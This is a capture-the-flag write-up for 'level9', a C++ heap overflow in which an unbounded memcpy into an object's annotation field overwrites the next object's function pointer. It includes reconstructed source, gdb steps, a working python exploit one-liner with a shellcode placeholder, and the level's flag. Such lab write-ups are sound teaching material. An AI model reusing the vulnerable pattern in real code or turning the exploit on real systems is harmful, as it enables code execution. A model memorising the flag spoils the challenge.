# level9 — C++ object overflow, overwrite a member function pointer

**Teaches:** C++ object layout; overflowing into an object's function pointer;
double dereference. NX is off so stack/heap shellcode still runs.

## 1. What the binary does
Takes one argument, does nothing visible.

## 2. Reconstructed C++ (source.cpp)
```cpp
class N {
public:
    int nb;
    int (N::*func)(N &);          // a member function pointer (right after nb)
    char annotation[100];
    N(int v) : nb(v) { func = &N::operator+; }
    int operator+(N &r) { return nb + r.nb; }
    void setAnnotation(char *s) { memcpy(annotation, s, strlen(s)); } // overflow
};
int main(int ac, char **av) {
    N *a = new N(5);
    N *b = new N(6);
    a->setAnnotation(av[1]);       // unbounded memcpy into a->annotation
    return (b->*(b->func))(*a);     // calls b->func -- a pointer we can reach
}
```

## 3. The vulnerability
`setAnnotation` does `memcpy(annotation, av[1], strlen(av[1]))` — no bound. The
objects `a` and `b` are consecutive heap allocations. Overflowing `a`'s
`annotation` runs into object `b`, overwriting **`b->func`** (and the vtable-like
pointer `main` dereferences). The final call `(b->*(b->func))(*a)` does a
**double dereference**, so our overwritten value must point to an address that
points to our shellcode.

## 4. Layout & the double dereference
`main` does roughly: `eax = *b; edx = *eax; call edx`. So `*b` must be an address
X, and `*X` must be the shellcode entry. We set `*b = bufaddr+4`, and put the
shellcode at `bufaddr+4`.

## 5. Step by step
1. `info functions` → `N::setAnnotation`, `operator+`, `operator-`, `main`. No
   `/bin/sh` string → we supply **shellcode**.
2. Offset until the overwritten pointer (crash reads `eax`) = **108**.
3. Find the buffer address after `setAnnotation`:
   ```
   (gdb) b *main+136
   (gdb) run AAAA
   (gdb) x $eax      -> 0x0804a00c   (the buffer)
   ```
   So the shellcode start = `0x0804a00c + 4 = 0x0804a010`; the value we write is
   `0x0804a00c` (which then points at `0x0804a010`).

## 6. Exploit
```
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "<28-byte shellcode>" + "A"*76 + "\x0c\xa0\x04\x08"')
```
Layout = `shell_addr(4) + shellcode(28) + pad(76) = 108`, then `buffer_addr(4)`.

**Why it works:** the trailing 4 bytes overwrite `b`'s pointer with
`0x0804a00c`; `main` dereferences it to `0x0804a010` and calls it — the start of
your shellcode.

Flag → `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`
